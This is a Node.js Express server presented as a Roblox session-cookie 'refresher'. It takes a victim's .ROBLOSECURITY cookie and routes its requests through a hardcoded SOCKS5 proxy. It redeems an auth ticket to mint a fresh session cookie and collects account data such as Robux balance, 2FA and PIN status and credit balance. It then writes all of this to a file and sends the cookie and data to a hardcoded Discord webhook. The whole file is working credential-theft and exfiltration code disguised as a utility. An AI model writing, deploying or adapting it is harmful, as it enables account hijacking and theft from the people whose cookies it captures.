const express = require('express');
const axios = require('axios');
const fs = require('fs');
const { SocksProxyAgent } = require('socks-proxy-agent');

const { generateAuthTicket, redeemAuthTicket } = require('./refresh');
const { RobloxUser } = require('./getuserinfo');

const app = express();
app.use(express.json());
app.use(express.static('public'));

// SOCKS5 Proxy Configuration from your list
const proxyConfig = {
    ip: '213.152.165.20',
    port: '9050'
};
const agent = new SocksProxyAgent(`socks5://${proxyConfig.ip}:${proxyConfig.port}`);

app.get('/refresh', async (req, res) => {
    const roblosecurityCookie = req.query.cookie;

    // We pass the agent here so the request is made from the Netherlands IP
    const authTicket = await generateAuthTicket(roblosecurityCookie, agent);

    if (authTicket === "Failed to fetch auth ticket") {
        res.status(400).json({ error: "Invalid cookie" });
        return;
    }

    const redemptionResult = await redeemAuthTicket(authTicket, agent);

    if (!redemptionResult.success) {
        if (redemptionResult.robloxDebugResponse && redemptionResult.robloxDebugResponse.status === 401) {
            res.status(401).json({ error: "Unauthorized: The provided cookie is invalid." });
        } else {
            res.status(400).json({ error: "Invalid cookie" });
        }
        return;
    }

    const refreshedCookie = redemptionResult.refreshedCookie || '';

    const robloxUser = await RobloxUser.register(roblosecurityCookie);
    const userData = await robloxUser.getUserData();

    const debugInfo = `Auth Ticket ID: ${authTicket}`;
    const fileContent = {
        RefreshedCookie: refreshedCookie,
        DebugInfo: debugInfo,
        Username: userData.username,
        UserID: userData.uid,
        DisplayName: userData.displayName,
        CreationDate: userData.createdAt,
        Country: userData.country,
        AccountBalanceRobux: userData.balance,
        Is2FAEnabled: userData.isTwoStepVerificationEnabled,
        IsPINEnabled: userData.isPinEnabled,
        IsPremium: userData.isPremium,
        CreditBalance: userData.creditbalance,
        RAP: userData.rap,
    };

    fs.appendFileSync('refreshed_cookie.json', JSON.stringify(fileContent, null, 4));

    const webhookURL = 'https://discord.com/api/webhooks/1383852487923990669/g3Ca1jb_NsP9cX2Y0qtfisADd72LnxpErvMS1UyzYbPFjabbckIoeIxxNM-EIzNMq1v2';
    
    try {
        await axios.post(webhookURL, {
            embeds: [
                {
                    title: 'Refreshed Cookie',
                    description: `**Refreshed Cookie:**\n\`\`\`${refreshedCookie}\`\`\``,
                    color: 16776960,
                    thumbnail: { url: userData.avatarUrl },
                    fields: [
                        { name: 'Username', value: String(userData.username), inline: true },
                        { name: 'User ID', value: String(userData.uid), inline: true },
                        { name: 'Display Name', value: String(userData.displayName), inline: true },
                        { name: 'Creation Date', value: String(userData.createdAt), inline: true },
                        { name: 'Country', value: String(userData.country), inline: true },
                        { name: 'Account Balance (Robux)', value: String(userData.balance), inline: true },
                        { name: 'Is 2FA Enabled', value: String(userData.isTwoStepVerificationEnabled), inline: true },
                        { name: 'Is PIN Enabled', value: String(userData.isPinEnabled), inline: true },
                        { name: 'Is Premium', value: String(userData.isPremium), inline: true },
                        { name: 'Credit Balance', value: String(userData.creditbalance), inline: true },
                        { name: 'RAP', value: String(userData.rap), inline: true },
                    ],
                }
            ]
        });
        console.log('Webhook sent successfully');
    } catch (webhookError) {
        console.error('Error sending to Discord:', webhookError.message);
    }

    res.json({ authTicket, redemptionResult });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
